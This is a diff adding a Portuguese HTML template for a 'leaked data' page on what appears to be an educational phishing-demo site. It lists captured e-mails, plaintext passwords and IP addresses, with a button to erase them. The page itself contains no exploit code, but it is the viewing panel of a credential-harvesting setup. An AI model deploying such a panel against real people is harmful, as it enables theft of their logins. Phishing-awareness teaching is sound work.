@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex"> <!--- Indica para os mecanismos de busca para não rastrearem esta página -->
+    <link rel="stylesheet" href="/static/style.css">
+    <title>Dados vazados</title>
+</head>
+<body>
+    <section class="flexMinCenter">
+        <style>
+            .panel {
+                box-shadow: inset 0 0 4px #e62169;
+            }
+            .primaryButton{
+                background-color: #e62169 !important;
+            }
+
+            .plainButton,
+            .plainButton *{
+                color: #e62169 !important;
+            }
+
+            .plainButton, .primaryButton{
+                display: flex;
+                flex-direction: row;
+                justify-content: center;
+                align-items: center;
+                gap: 8px;
+            }
+        </style>
+        <div class="panel">
+            <h1><i class="fa-solid fa-mosquito"></i></h1>
+            <h1 style="font-weight: 600;">Dados vazados</h1>
+            <h3>Se houver uma informação sensível aqui, apague o log completo.</h3>
+            <p style="color: #e62169; margin-top: 8px;">Tudo que está aqui é público acessando esta rota /leaks, apague o quanto antes.</p>
+            
+            <div class="flex rowFlex wp100 alignCenter justifyCenter" style="margin-top: 16px;">
+                <button onclick="window.location.href = '/clear'" class="primaryButton"><i class="fa-solid fa-trash-can"></i>Apagar tudo</button>
+                <span class="flexExpand"></span>
+                <button onclick="window.location.reload()" class="primaryButton"><i class="fa-solid fa-arrow-rotate-right"></i>Atualizar</button>
+            </div>
+            <span class="littleMargin"></span>
+            {% if log == [] %}
+                <h3 style="align-self: center; text-align: center; opacity: 0.5;">Sem dados vazados</h3>
+            {% endif %}
+            {% for leak in log | reverse %}
+            <div class="innerPanel" style="width: 100% !important;">
+                <p style="align-self: center; ">{{ format_relative_time(leak.timestamp) }}</p>
+                <ul class="wp100">
+                    
+                        <li> <b>E-mail: </b> {{leak.email }}</li>
+                        <li> <b>Senha: </b> {{leak.password }}</li>
+                        <li> <b>Endereço IP </b> {{leak.ip_address }}</li>
+                </ul>
+            </div>
+           
+            
+            {% endfor %}
+            <span class="littleMargin"></span>
+            <p style="color: #e62169; margin-top: 8px;">Você pode apagar essas informações sensíveis a qualquer momento, estando de acordo com a LGPD, é importante ressaltar ainda que este site é destinado a fins educativos sobre cibersegurança e apresenta um dos tipos mais comuns e fáceis de ataque, o phishing.</p>
+        </div>
+        
+    </section>
+    
+</body>
+</html>
